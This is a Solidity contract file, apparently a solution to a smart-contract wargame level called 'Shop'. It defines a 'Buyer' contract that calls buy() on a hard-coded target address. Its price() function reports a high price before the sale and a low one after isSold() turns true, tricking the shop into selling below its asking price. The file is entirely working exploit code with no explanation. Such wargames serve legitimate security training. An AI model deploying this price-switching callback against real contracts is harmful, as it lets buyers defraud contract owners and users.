// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {
    address private constant TARGET_ADDRESS = 0xe305FbB022a127E279d75F2cADd913ff05C1B56D;
    uint256 private constant COSTLY = 150;
    uint256 private constant CHEAPER = 50;
    IShop target;

    constructor() {
        target = IShop(TARGET_ADDRESS);
    }

    function price() public view returns (uint256) {
        bool isSold = target.isSold();
        return (isSold) ? CHEAPER : COSTLY;
    }

    function buy() public {
        target.buy();
    }

}